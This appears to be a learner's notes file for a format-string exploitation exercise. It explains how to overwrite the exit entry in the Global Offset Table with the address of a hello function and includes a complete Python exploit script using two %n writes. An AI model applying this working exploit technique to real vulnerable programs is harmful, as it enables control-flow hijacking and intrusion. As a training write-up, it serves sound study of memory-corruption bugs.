@@ -1,0 +1,41 @@
+
+This is the most realistic (compairing to 2021 kernel) problem.
+
+The exercice consist to modify de Global Ofset Table (GOT) and change the address of a lib function (in this case exit)
+from a desired address (in this case the function hello). It must be performed exploiting printf bad format.
+
+1) Find the address of the function "hello": examine it in gdb
+2) Find the address of the GOT for exit: dissemble the exit @plt and just find the reference to the libc exit (dynamic linking)
+3) Find the start of the stack using %p %x in the printf to leak some values
+4) Once the begin of the stack is known calculate how mush padding is needed to write the address of the exit in the GOT table on the stack
+5) Now just need to use %n and we can re-write in this address everything we want
+6) The problem right now is that a very large number of caracters must be printed to perform the overwriting (the address is > 1M )
+7) This is possible to do with the padding of printf, but i can be more elegant ... (So, The problem could end here)
+7) Here a trick from LiveOverlowYT: is possible to write first the last 2 bytes and then the next 2 bytes using 2 %n instead of one.
+	This is faster, easier and a good trick i want to remember.
+8) Once the right amount of bytes are written, that's it, hacked!
+
+script:
+
+
+import struct
+
+hello = 0x80484b4
+plt_exit = 0x8049724
+
+def pad(s):
+	return s+"X"*(512 - len(s))
+
+exploit = "" 
+exploit += struct.pack("I", plt_exit)		#4th elem in the stack
+exploit += struct.pack("I", plt_exit + 2)	#5th elem in the stack
+exploit += "AAAABBBB"						#6th elem in the stack
+exploit += "%4$33956x"						#Last 2 bytes of hello (84b4)
+exploit += "%4$n"
+exploit += "%33616x"						#First 2 bytes of hello (8048)
+exploit += "%5$n"
+
+print pad(exploit)
+
+This exercice was fucking amazing! Thanks to LiveOverlowYT to bring me the knowlegde !
+
